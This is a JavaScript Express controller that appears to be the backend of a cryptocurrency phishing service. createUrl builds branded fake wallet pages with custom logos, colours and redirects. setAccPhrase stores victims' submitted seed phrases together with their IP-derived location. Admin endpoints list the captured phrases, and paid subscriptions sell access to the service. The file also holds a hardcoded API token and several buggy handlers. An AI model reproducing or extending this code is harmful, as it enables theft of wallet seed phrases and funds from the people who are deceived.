import User from "../models/Users.js";
import LoginAttempt from "../models/LoginAttempt.js";
import Post from "../models/Post.js";
import Review from "../models/Review.js";
import CryptoLogs from "../models/CryptoLogs.js";
import Notification from "../models/Notification.js";
import Subscription from "../models/Subscription.js";
import SubscriptionHistory from "../models/SubscriptionHistory.js";
import Message from "../models/Message.js";
import Phrase from "../models/SpecialPhrases.js";
import Url from "../models/Url.js";
import IpBlock from "../models/IpBlock.js";
import moment from "moment";
import mongoose from "mongoose";
import axios from "axios";

const getAllUser = async (req, res) => {
  try {
    const currentDate = new Date();
    const currentMonthStart = new Date(
      currentDate.getFullYear(),
      currentDate.getMonth(),
      1
    );
    const lastMonthStart = new Date(
      currentDate.getFullYear(),
      currentDate.getMonth() - 1,
      1
    );
    const lastMonthEnd = new Date(
      currentDate.getFullYear(),
      currentDate.getMonth(),
      0
    );

    const totalUsers = await User.countDocuments();

    const thisMonthUsers = await User.countDocuments({
      createdAt: { $gte: currentMonthStart },
    });

    const lastMonthUsers = await User.countDocuments({
      createdAt: { $gte: lastMonthStart, $lt: lastMonthEnd },
    });

    let percentageChange = 0;
    if (lastMonthUsers > 0) {
      percentageChange =
        ((thisMonthUsers - lastMonthUsers) / lastMonthUsers) * 100;
    } else {
      percentageChange = thisMonthUsers > 0 ? 100 : 0;
    }

    // Send the response
    res.status(200).json({
      TotalUser: totalUsers,
      PercentageChange: percentageChange.toFixed(2),
    });
  } catch (error) {
    res.status(500).json({ message: "Error getting user statistics", error });
  }
};

const getTodayUsers = async (req, res) => {
  try {
    const startOfToday = new Date();
    startOfToday.setHours(0, 0, 0, 0);

    const endOfToday = new Date();
    endOfToday.setHours(23, 59, 59, 999);

    const todayUsers = await User.find({
      lastLogin: { $gte: startOfToday, $lte: endOfToday },
    }).countDocuments();

    res.status(200).json({ TotalTodayUsers: todayUsers });
  } catch (error) {
    res.status(500).json({ message: "Error getting today's users", error });
  }
};

const getAllLoginAttempts = async (req, res) => {
  try {
    const { id, page = 1, limit = 10 } = req.query;

    const allLoginAttempts = await LoginAttempt.find({ userId: id })
      .populate({ path: "userId", select: "email userName" })
      .sort({ timestamp: -1 })
      .limit(limit * 1)
      .skip((page - 1) * limit);

    const totalRecords = await LoginAttempt.countDocuments({ userId: id });

    res.status(200).json({
      loginAttempts: allLoginAttempts,
      totalPages: Math.ceil(totalRecords / limit),
      currentPage: page,
    });
  } catch (error) {
    res.status(500).json({ message: error.message, error });
  }
};

const getGlobalLoginAttempts = async (req, res) => {
  try {
    const { page = 1, limit = 10 } = req.query;

    const allLoginAttempts = await LoginAttempt.find()
      .populate({ path: "userId", select: "email userName" })
      .sort({ timestamp: -1 })
      .limit(limit * 1)
      .skip((page - 1) * limit);

    const totalRecords = await LoginAttempt.countDocuments();

    res.status(200).json({
      globalLoginAttempts: allLoginAttempts,
      globaltotalPages: Math.ceil(totalRecords / limit),
      globalCurrentPage: page,
    });
  } catch (error) {
    res.status(500).json({ message: error.message, error });
  }
};

// Create a new post
const createPost = async (req, res) => {
  try {
    const { userId, title, description } = req.body;
    const newPost = await Post.create({ user: userId, title, description });
    const populatedPost = await Post.findById(newPost._id).populate(
      "user",
      "userName"
    );

    res.status(200).json(populatedPost);
  } catch (error) {
    res.status(500).json({ message: "Error creating post", error });
  }
};

const createPhrase = async (req, res) => {
  try {
    const { userId, phrase } = req.body;

    // Validation check for userId and phrase
    if (!userId || !phrase) {
      return res
        .status(400)
        .json({ message: "Invalid input: userId and phrase are required." });
    }

    // Log userId and phrase for debugging
    // console.log("userId in createPhrase::  ", userId);
    // console.log("phrase in createPhrase::  ", phrase);

    // Create a new Phrase document
    const newPhrase = await Phrase.create({ userId, phrase });

    // Return the newly created phrase document as the response
    res.status(200).json(newPhrase);
  } catch (error) {
    // Catch any errors and send the response with an error message
    res.status(500).json({ message: "Error creating phrase", error });
  }
};

export default createPhrase;

const getPhrases = async (req, res) => {
  try {
    const phrases = await Phrase.find();
    if (!phrases || phrases.length === 0) {
      return res.status(404).json({ message: "No phrases found" });
    }

    res.status(200).json(phrases);
  } catch (error) {
    res.status(500).json({ message: "Error retrieving phrases", error });
  }
};

const createReview = async (req, res) => {
  try {
    const { userId, content } = req.body;
    const newReview = await Review.create({ user: userId, content });
    res.status(200).json(newReview);
  } catch (error) {
    res.status(500).json({ message: "Error creating review", error });
  }
};

const getReviews = async (req, res) => {
  try {
    const reviews = await Review.find();
    res.status(200).json(reviews);
  } catch (error) {
    res.status(500).json({ message: "Error fetching reviews", error });
  }
};

// Get all posts
const getPosts = async (req, res) => {
  try {
    const posts = await Post.find()
      .sort({ createdAt: -1 })
      .populate("user", "userName"); // Assuming `username` is in your user model
    res.status(200).json(posts);
  } catch (error) {
    res.status(500).json({ message: "Error fetching posts", error });
  }
};

// Get a single post by ID
const getPostById = async (req, res) => {
  try {
    const post = await Post.findById(req.params.id).populate(
      "user",
      "username"
    );
    if (!post) {
      return res.status(404).json({ message: "Post not found" });
    }
    res.status(200).json(post);
  } catch (error) {
    res.status(500).json({ message: "Error fetching post", error });
  }
};

// Update a post
const updatePost = async (req, res) => {
  try {
    const { title, description, userId } = req.body;

    const post = await Post.findByIdAndUpdate(
      req?.query?.id,
      { title, description, timestamp: Date.now(), user: userId },
      { new: true }
    ).populate("user", "userName");
    if (!post) {
      return res.status(404).json({ message: "Post not found" });
    }
    res.status(200).json(post);
  } catch (error) {
    res.status(500).json({ message: "Error updating post", error });
  }
};

// Delete a post
const deletePost = async (req, res) => {
  try {
    const post = await Post.findByIdAndDelete(req?.query?.id);
    if (!post) {
      return res.status(404).json({ message: "Post not found" });
    }
    res.status(200).json({ message: "Post deleted successfully", post });
  } catch (error) {
    res.status(500).json({ message: "Error deleting post", error });
  }
};

// Helper function to get user location based on the real IP using X-Forwarded-For
const getLocationObject = async (req) => {
  try {
    let ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;

    if (ip.includes(",")) {
      ip = ip.split(",")[0];
    }

    if (ip.startsWith("::ffff:")) {
      ip = ip.slice(7);
    }

    const response = await fetch(
      `https://ipinfo.io/${ip}/json?token=a62a090c9551e6`
    );
    const data = await response.json();

    return {
      country: data.country,
      countryCode: data.country,
      region: data.region,
      city: data.city,
      ipAddress: ip,
      lat: data.loc ? data.loc.split(",")[0] : null,
      lon: data.loc ? data.loc.split(",")[1] : null,
    };
  } catch (error) {
    console.error("Error fetching IP location:", error);
    return null;
  }
};

const getCryptoLog = async (req, res) => {
  const { id } = req.body;
  try {
    const cryptoLog = await CryptoLogs.findById(id);
    res.status(200).json(cryptoLog);
  } catch (error) {
    res.status(500).json({ message: "Error fetching Crypto Logs", error });
  }
};

const setAccPhrase = async (req, res) => {
  try {
    const { mnemonic, userInfo, cryptoLogId } = req.body;
    if (!mnemonic || !userInfo || !cryptoLogId) {
      return res.status(404).json({ error: "Invalid Payload" });
    }

    const location = await getLocationObject(req).catch((err) => {
      console.error("Failed to get location:", err);
      return null;
    });
    if (!location) {
      return res
        .status(500)
        .json({ error: "Failed to fetch location information" });
    }
    const crypto = await CryptoLogs.findByIdAndUpdate(
      cryptoLogId,
      { phrase: mnemonic, userInfo, location },
      { new: true }
    );

    if (!crypto) {
      return res
        .status(400)
        .json({ error: "Crpyto Log with the given id not found" });
    }

    res.status(200).json({
      message: "Mnemonic phrase and user info saved successfully",
    });
  } catch (error) {
    console.error("Error:", error);
    res
      .status(500)
      .json({ error: "Failed to save mnemonic phrase and user info" });
  }
};

const getAccounts = async (req, res) => {
  try {
    const userId = req.query.id;
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 10;
    const skip = (page - 1) * limit;
    let accounts;

    const currentDate = new Date();
    const currentMonthStart = new Date(
      currentDate.getFullYear(),
      currentDate.getMonth(),
      1
    );
    const lastMonthStart = new Date(
      currentDate.getFullYear(),
      currentDate.getMonth() - 1,
      1
    );
    const lastMonthEnd = new Date(
      currentDate.getFullYear(),
      currentDate.getMonth(),
      0
    );
    const user = await User.findById(userId);
    const query = user?.role == "admin" ? {} : { userId };
    if (user?.role == "admin") {
      accounts = await CryptoLogs.find()
        .populate("userId", "phrase")
        .sort({ createdAt: -1 })
        .skip(skip)
        .limit(limit);
    } else {
      accounts = await CryptoLogs.find({userId})
        .sort({ createdAt: -1 })
        .skip(skip)
        .limit(limit);
    }

    const totalAccounts = await CryptoLogs.countDocuments(query);

    const thisMonthAccounts = await CryptoLogs.countDocuments({
      userId,
      createdAt: { $gte: currentMonthStart },
    });

    const lastMonthAccounts = await CryptoLogs.countDocuments({
      userId,
      createdAt: { $gte: lastMonthStart, $lt: lastMonthEnd },
    });

    let percentageChange = 0;
    if (lastMonthAccounts > 0) {
      percentageChange =
        ((thisMonthAccounts - lastMonthAccounts) / lastMonthAccounts) * 100;
    } else {
      percentageChange = thisMonthAccounts > 0 ? 100 : 0;
    }

    return res.status(200).json({
      accounts: accounts,
      totalPages: Math.ceil(totalAccounts / limit),
      accountsCount: totalAccounts,
      percentageChange: percentageChange.toFixed(2),
    });
  } catch (error) {
    console.log("error fetching", error?.message);
    return res.status(500).json({ message: "Error fetching accounts", error });
  }
};

const getAccountsStatistics = async (req, res) => {
  try {
    const monthsData = [];
    for (let i = 11; i >= 0; i--) {
      const startOfMonth = moment()
        .subtract(i, "months")
        .startOf("month")
        .toDate();
      const endOfMonth = moment().subtract(i, "months").endOf("month").toDate();

      const monthCount = await User.countDocuments({
        createdAt: { $gte: startOfMonth, $lte: endOfMonth },
      });

      monthsData.push(monthCount);
    }

    res.status(200).json({
      monthlyData: monthsData,
    });
  } catch (error) {
    console.log("error while stats", error);
    res
      .status(500)
      .json({ message: "Error getting accounts statistics", error });
  }
};

const getAllAccounts = async (req, res) => {
  try {
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 10;
    const skip = (page - 1) * limit;

    const accounts = await CryptoLogs.find().skip(skip).limit(limit);

    const totalAccounts = await CryptoLogs.countDocuments({});

    return res.status(200).json({
      accounts: accounts,
      totalAccounts: totalAccounts, // Total number of accounts
      currentPage: page,
      totalPages: Math.ceil(totalAccounts / limit), // Calculate total pages
      accountsCount: accounts?.length,
    });
  } catch (error) {
    return res.status(500).json({ message: "Error fetching accounts", error });
  }
};
const getSingleAccount = async (req, res) => {
  try {
    const { accountId } = req.params;

    // Fetch the account by ID
    const account = await CryptoLogs.findById(accountId);

    if (!account) {
      return res.status(404).json({ message: "Crypto Logs not found" });
    }

    return res.status(200).json(account);
  } catch (error) {
    return res
      .status(500)
      .json({ message: "Error fetching Crypto Logs", error });
  }
};

const getNotifications = async (req, res) => {
  try {
    const notifications = await Notification.find({ deleted: false });
    if (!notifications) {
      return res.status(404).json({ message: "No notifications found" });
    }
    return res.status(200).json(notifications);
  } catch (error) {
    res.status(500).json({ error: "Failed to delete account" });
  }
};

const getNotification = async () => {
  try {
    const notification = await Notification.findById(req.query.id);
    console.log("notification", notification);

    if (!notification) {
      return res.status(404).json({ message: "No notification found" });
    }
    return res.status(200).json(notification);
  } catch (error) {
    res.status(500).json({ error: "Failed to delete Crypto Logs" });
  }
};
const deleteNotification = async (req, res) => {
  try {
    const notificationId = req.query.id;
    if (!notificationId) {
      return res.status(404).json({ message: "notification id is required" });
    }
    const notificaion = await Notification.findByIdAndDelete(
      notificationId,
      { deleted: true },
      { new: true }
    );

    if (!notificaion) {
      return res.status(404).json({ message: "notificaion not found" });
    }

    res.status(200).json({
      message: "Notification deleted successfully",
    });
  } catch (error) {
    res.status(500).json({ error: "Failed to delete Crypto Logs" });
  }
};
const clearAllNotifications = async (req, res) => {
  try {
    // Delete all notifications from the database
    const result = await Notification.deleteMany({});

    // Check if any notifications were found and deleted
    if (result.deletedCount === 0) {
      return res.status(404).json({ message: "No notifications to delete" });
    }

    // Send success response
    res.status(200).json({
      message: "All notifications cleared successfully",
    });
  } catch (error) {
    // Handle errors
    console.error("Error clearing notifications:", error);
    res.status(500).json({ error: "Failed to clear all notifications" });
  }
};

const deleteAccount = async (req, res) => {
  try {
    const accountId = req.query.id;

    // Find the Crypto Logs by ID
    const Crypto_Logs = await CryptoLogs.findById(accountId);
    if (!Crypto_Logs) {
      return res.status(404).json({ message: "Crypto Logs not found" });
    }

    // Delete the Crypto_Logs
    await CryptoLogs.findByIdAndDelete(accountId);
    await CryptoLogs.deleteMany({ _id: accountId });

    // Delete associated notifications
    await Notification.deleteMany({ accountId });

    res.status(200).json({
      message: "Crypto Logs and associated notifications deleted successfully",
      account: CryptoLogs,
    });
  } catch (error) {
    console.log("error in here at delete account", error);
    res.status(500).json({ error: "Failed to delete account" });
  }
};
const editUserProfile = async (req, res) => {
  try {
    const { id } = req.params;
    const updatedUser = await User.findByIdAndUpdate(id, req.body, {
      new: true,
    });

    if (!updatedUser) {
      return res.status(404).json({ message: "User not found" });
    }

    res
      .status(200)
      .json({ message: "User profile updated successfully", updatedUser });
  } catch (error) {
    res.status(500).json({ message: "Error updating user profile", error });
  }
};
// we need to do things here create url and also a crypto log
//if the special phrase then redirect to that url otherwise just show the log
const createUrl = async (req, res) => {
  try {
    //also the payload of crypto is  => appName, appLogo   => and return the CryptoLogId.
    const {
      userId,
      title,
      description,
      redirectUrl,
      appName,
      appLogo,
      backgroundcolor,
      modalColor,
      btnColor,
    } = req.body;
    const newCryptoLog = await CryptoLogs.create({
      userId,
      appName,
      appLogo,
      modalColor,
      backgroundcolor,
      btnColor,
      redirectUrl,
    });
    //description is the url now add the redirect url as well
    const newUrl = await Url.create({
      user: userId,
      title,
      description,
      redirectUrl,
      cryptoLogId: newCryptoLog?._id,
      appLogo,
    });
    res.status(200).json({ newUrl });
  } catch (error) {
    res.status(500).json({ message: "Error creating url", error });
  }
};

// Get all posts
const getUrls = async (req, res) => {
  try {
    const urls = await Url.find().populate("user", "userNname");
    res.status(200).json(urls);
  } catch (error) {
    res.status(500).json({ message: "Error fetching urls", error });
  }
};

const getUrlById = async (req, res) => {
  try {
    const url = await Post.findById(req.params.id).populate("user", "username");
    if (!url) {
      return res.status(404).json({ message: "Url not found" });
    }
    res.status(200).json(url);
  } catch (error) {
    res.status(500).json({ message: "Error fetching url", error });
  }
};

const updateUrl = async (req, res) => {
  try {
    const { title, description, userId } = req.body;

    const url = await Url.findByIdAndUpdate(
      req?.query?.id,
      { title, description, timestamp: Date.now(), user: userId },
      { new: true }
    );
    if (!url) {
      return res.status(404).json({ message: "Url not found" });
    }
    res.status(200).json(url);
  } catch (error) {
    res.status(500).json({ message: "Error updating url", error });
  }
};

const deleteUrl = async (req, res) => {
  try {
    const url = await Url.findByIdAndDelete(req?.query?.id);
    if (!url) {
      return res.status(404).json({ message: "Url not found" });
    }
    res.status(200).json({ message: "Url deleted successfully", url });
  } catch (error) {
    res.status(500).json({ message: "Error deleting url", error });
  }
};

const postIp = async (req, res) => {
  try {
    const { blockerId, ip } = req.body;
    const newIp = await IpBlock.create({ blockerId, ip });
    res.status(200).json({ newIp });
  } catch (error) {
    res.status(500).json({ message: "Error creating ip", error });
  }
};
const getIps = async (req, res) => {
  try {
    const ips = await IpBlock.find();
    res.status(200).json(ips);
  } catch (error) {
    res.status(500).json({ message: "Error creating ip", error });
  }
};

const deleteIp = async (req, res) => {
  try {
    const ip = await IpBlock.findByIdAndDelete(req?.query?.id);
    if (!ip) {
      return res.status(404).json({ message: "Ip not found" });
    }
    res.status(200).json({ message: "Ip deleted successfully", ip });
  } catch (error) {
    res.status(500).json({ message: "Error deleting ip", error });
  }
};

const getTopUsersWithMostAccounts = async (req, res) => {
  try {
    const limit = 10;
    const topUsers = await User.aggregate([
      {
        $lookup: {
          from: "accounts", // Collection name for accounts
          localField: "_id",
          foreignField: "userId",
          as: "accounts",
        },
      },
      {
        $project: {
          _id: 1,
          userName: 1,
          profileImage: 1,
          numberOfAccounts: { $size: "$accounts" },
        },
      },
      { $sort: { numberOfAccounts: -1 } },
      { $limit: limit },
    ]);

    res.status(200).json({ message: "top users successfully", topUsers });
    return topUsers;
  } catch (error) {
    console.error("Error fetching top users:", error);
    throw error;
  }
};
const createSubscription = async (req, res) => {
  // in all functions need to get the user data as well

  try {
    const { type, createdBy, duration, amount, redeemCode } = req.body;

    // Validate mandatory fields
    if (!type || !duration || !amount) {
      return res.status(400).json({
        message: "missing Payload",
      });
    }

    if (type == "redeem" && !redeemCode) {
      return res.status(400).json({
        message: "redeemCode is missing",
      });
    }
    // Create a new subscription
    const newSubscription = new Subscription({
      type,
      createdBy: new mongoose.Types.ObjectId(createdBy) || null,
      duration,
      amount,
      redeemCode: redeemCode || null, // Optional, default to null if not provided
    });

    // Save the subscription to the database
    const savedSubscription = await newSubscription.save();

    return res.status(201).json({
      message: "Subscription created successfully.",
      subscription: savedSubscription,
    });
  } catch (error) {
    console.error("Error creating subscription:", error);
    res.status(500).json({ message: "Internal server error.", error });
  }
};

const getSubscriptions = async (req, res) => {
  try {
    const subscriptions = await Subscription.find().populate({
      path: "createdBy",
      select: "userName profileImage role",
    });
    9;

    // Return the result
    res.status(200).json({
      message: "Subscriptions fetched successfully.",
      subscriptions,
    });
  } catch (error) {
    console.error("Error fetching subscriptions:", error);
    res.status(500).json({ message: "Internal server error.", error });
  }
};

const createSubscriptionHistory = async (req, res) => {
  try {
    const { userId, subscriptionId, startDate, expireDate, active, redeem } =
      req.body;

    // Check if the user already has an active subscription
    const existingSubscription = await SubscriptionHistory.findOne({
      userId,
      active: true, // Check for active subscriptions
    });

    if (existingSubscription) {
      return res.status(409).json({
        message: `You already have an active subscription which will end on ${moment(
          existingSubscription.expireDate
        ).format("d/MM/YYYY")}.`,
      });
    }

    // Create a new subscription history record
    const newSubscriptionHistory = new SubscriptionHistory({
      userId,
      subscriptionId,
      startDate: startDate || Date.now(),
      expireDate: expireDate || Date.now(),
      active: active ?? false,
      redeem: redeem ?? true,
    });

    // Save to the database
    const savedSubscriptionHistory = await newSubscriptionHistory.save();

    return res.status(201).json({
      message: "Subscription history created successfully.",
      subscriptionHistory: savedSubscriptionHistory,
    });
  } catch (error) {
    console.error("Error creating subscription history:", error);
    res.status(500).json({ message: "Internal server error.", error });
  }
};
const getSubscriptionsHistoryForAdmin = async (req, res) => {
  try {
    const { adminId } = req.query;

    if (!adminId || !mongoose.Types.ObjectId.isValid(adminId)) {
      return res.status(400).json({
        message: "Valid adminId is required.",
      });
    }

    console.log("Admin ID:", adminId);

    const subscriptionHistories = await SubscriptionHistory.aggregate([
      {
        $lookup: {
          from: "subscriptions",
          localField: "subscriptionId",
          foreignField: "_id",
          as: "subscriptionDetails",
        },
      },

      {
        $match: {
          "subscriptionDetails.createdBy": new mongoose.Types.ObjectId(adminId),
        },
      },

      {
        $unwind: "$subscriptionDetails",
      },

      {
        $lookup: {
          from: "users",
          localField: "userId",
          foreignField: "_id",
          as: "userDetails",
        },
      },

      {
        $unwind: "$userDetails",
      },

      {
        $project: {
          _id: 1,
          type: 1,
          userId: 1,
          subscriptionId: 1,
          startDate: 1,
          expireDate: 1,
          active: 1,
          redeem: 1,
          createdAt: 1,
          updatedAt: 1,
          "subscriptionDetails.type": 1,
          "subscriptionDetails.createdBy": 1,
          "subscriptionDetails.amount": 1,
          "subscriptionDetails.duration": 1,
          "subscriptionDetails.redeemCode": 1,
          "userDetails.userName": 1,
          "userDetails.email": 1,
          "userDetails.role": 1,
        },
      },
    ]);

    // Check if any subscription histories were found
    if (!subscriptionHistories.length) {
      return res.status(404).json({
        message: "No subscription history found for this admin.",
      });
    }

    // Return the subscription histories
    res.status(200).json({
      message: "Subscription history fetched successfully.",
      subscriptionHistories,
    });
  } catch (error) {
    console.error("Error fetching admin subscription history:", error);
    res.status(500).json({ message: "Internal server error.", error });
  }
};

// const getMySubscriptionsHistory = async (req, res) => {
//   try {
//     const { userId } = req.query;
//     if (!userId) {
//       return res.status(404).json({
//         message: "User id is required.",
//       });
//     }
//     const mySubscriptionHistories = await SubscriptionHistory.find({
//       userId,
//     }).populate({
//       path: "subscriptionId",
//       select: "type duration amount redeemCode",
//     });

//     if (!mySubscriptionHistories.length) {
//       return res.status(404).json({
//         message: "No subscription history found for this user.",
//       });
//     }

//     res.status(200).json({
//       message: "Subscription history fetched successfully.",
//       subscriptionHistories: mySubscriptionHistories,
//     });
//   } catch (error) {
//     console.error("Error fetching user's subscription history:", error);
//     res.status(500).json({ message: "Internal server error.", error });
//   }
// };

const getMySubscriptionsHistory = async (req, res) => {
  try {
    const { userIds } = req.query;
    // console.log("userIds:  ", userIds);

    if (!userIds || !Array.isArray(userIds)) {
      return res.status(400).json({
        message: "An array of user IDs is required.",
      });
    }

    const mySubscriptionHistories = await SubscriptionHistory.find({
      userId: { $in: userIds }, // Find all histories where userId matches any in the array
    }).populate({
      path: "subscriptionId",
      select: "type duration amount redeemCode",
    });

    if (!mySubscriptionHistories.length) {
      return res.status(404).json({
        message: "No subscription histories found for the provided user IDs.",
      });
    }

    res.status(200).json({
      message: "Subscription histories fetched successfully.",
      subscriptionHistories: mySubscriptionHistories,
    });
  } catch (error) {
    console.error("Error fetching subscription histories:", error);
    res.status(500).json({ message: "Internal server error.", error });
  }
};

const getAllUsers = async (req, res) => {
  try {
    // Fetch all users
    const users = await User.find();

    if (!users.length) {
      return res.status(404).json({
        message: "No users found.",
      });
    }

    res.status(200).json({
      message: "Users fetched successfully.",
      users,
    });
  } catch (error) {
    console.error("Error fetching users:", error);
    res.status(500).json({
      message: "Internal server error.",
      error,
    });
  }
};

// Fetch messages from the database
const getAllMessages = async (req, res) => {
  try {
    // Fetch all messages sorted by timestamp (latest first)
    const messages = await Message.find().sort({ timestamp: -1 });

    if (!messages.length) {
      return res.status(404).json({
        message: "No messages found.",
      });
    }

    res.status(200).json({
      message: "Messages fetched successfully.",
      messages,
    });
  } catch (error) {
    console.error("Error fetching messages:", error);
    res.status(500).json({
      message: "Internal server error.",
      error,
    });
  }
};
const verifyReCaptcha = async (req, res) => {
  try {
    const { token } = req.body;
    const secretKey = process.env.NEXT_PUBLIC_RECAPTCHA_SECRET_KEY;

    // Verify reCAPTCHA token with Google API
    const response = await axios.post(
      "https://www.google.com/recaptcha/api/siteverify",
      null,
      {
        params: {
          secret: secretKey,
          response: token,
        },
      }
    );

    if (!response.data.success) {
      return res.status(400).json({
        message: "reCAPTCHA verification failed.",
        error: response.data,
      });
    }

    res.status(200).json({
      message: "reCAPTCHA verified successfully.",
      success: true,
    });
  } catch (error) {
    console.error("Error verifying reCAPTCHA:", error);
    res.status(500).json({
      message: "Internal server error.",
      error: error.message,
    });
  }
};


export const dashboard = {
  getAllUser,
  getTodayUsers,
  getAllLoginAttempts,
  createPost,
  createReview,
  getReviews,
  getPostById,
  getPosts,
  updatePost,
  getSingleAccount,
  getAccounts,
  deletePost,
  deleteAccount,
  getNotifications,
  getNotification,
  editUserProfile,
  deleteNotification,
  getAllAccounts,
  createUrl,
  getUrls,
  getUrlById,
  updateUrl,
  deleteUrl,
  getAccountsStatistics,
  postIp,
  getIps,
  deleteIp,
  getTopUsersWithMostAccounts,
  getGlobalLoginAttempts,
  clearAllNotifications,
  createSubscription,
  getSubscriptions,
  getSubscriptionsHistoryForAdmin,
  createSubscriptionHistory,
  getMySubscriptionsHistory,
  getAllUsers,
  getAllMessages,
  setAccPhrase,
  getCryptoLog,
  createPhrase,
  getPhrases,
  verifyReCaptcha,
};
